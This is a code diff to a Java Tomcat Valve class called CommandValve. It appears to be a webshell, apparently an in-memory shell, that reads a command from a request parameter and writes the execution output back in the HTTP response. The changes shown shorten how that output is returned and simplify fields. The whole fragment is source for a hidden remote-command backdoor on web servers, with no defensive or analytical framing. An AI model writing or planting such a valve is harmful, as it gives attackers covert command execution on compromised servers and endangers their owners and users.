@@ -8,12 +8,13 @@ import javax.servlet.ServletException;
 import javax.servlet.ServletOutputStream;
 import java.io.IOException;
 import java.io.InputStream;
+import java.util.Scanner;
 
 /**
  * @author ReaJason
  */
 public class CommandValve implements Valve {
-    private static String paramName;
+    static String paramName;
 
     @Override
     public void invoke(Request request, Response response) throws IOException, ServletException {
@@ -21,12 +22,7 @@ public class CommandValve implements Valve {
             String param = getParam(request.getParameter(paramName));
             if (param != null) {
                 InputStream inputStream = getInputStream(param);
-                ServletOutputStream outputStream = response.getOutputStream();
-                byte[] buf = new byte[8192];
-                int length;
-                while ((length = inputStream.read(buf)) != -1) {
-                    outputStream.write(buf, 0, length);
-                }
+                response.getWriter().write(new Scanner(inputStream).useDelimiter("\\A").next());
                 return;
             }
         } catch (Throwable e) {
@@ -43,8 +39,7 @@ public class CommandValve implements Valve {
         return null;
     }
 
-    protected Valve next;
-    protected boolean asyncSupported;
+    Valve next;
 
     @Override
     public Valve getNext() {
@@ -58,7 +53,7 @@ public class CommandValve implements Valve {
 
     @Override
     public boolean isAsyncSupported() {
-        return this.asyncSupported;
+        return false;
     }
 
     @Override
